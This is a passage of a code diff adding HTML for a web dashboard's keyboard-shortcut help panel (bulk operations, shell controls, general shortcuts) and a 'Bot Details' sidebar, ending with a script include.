+                    <div class="help-row"><span class="help-action">Checkbox + toolbar</span><span>Bulk
+                            operations</span></div>
+                </div>
+                <div class="help-section">
+                    <div class="help-section-title">Shell</div>
+                    <div class="help-row"><kbd>Tab</kbd><span>Autocomplete ! commands</span></div>
+                    <div class="help-row"><kbd>&uarr;</kbd> / <kbd>&darr;</kbd><span>Command history</span></div>
+                    <div class="help-row"><kbd>Ctrl+=</kbd> / <kbd>Ctrl+-</kbd><span>Zoom terminal font</span></div>
+                    <div class="help-row"><span class="help-action">Right-click file</span><span>File context menu</span></div>
+                    <div class="help-row"><kbd>Escape</kbd><span>Close shell</span></div>
+                </div>
+                <div class="help-section">
+                    <div class="help-section-title">General</div>
+                    <div class="help-row"><kbd>Escape</kbd><span>Close any modal or overlay</span></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Page-wide bot detail sidebar (fixed right panel) -->
+    <div class="bot-detail-sidebar" id="bot-detail-sidebar">
+        <div class="bds-header">
+            <span class="bds-title" id="bds-title">Bot Details</span>
+            <button class="bds-close" onclick="closeBotSidebar()" title="Close">&times;</button>
+        </div>
+        <div class="bds-body" id="bds-body"></div>
+    </div>
+
+    <script src="/static/app.js"></script>
+</body>
+
+</html>
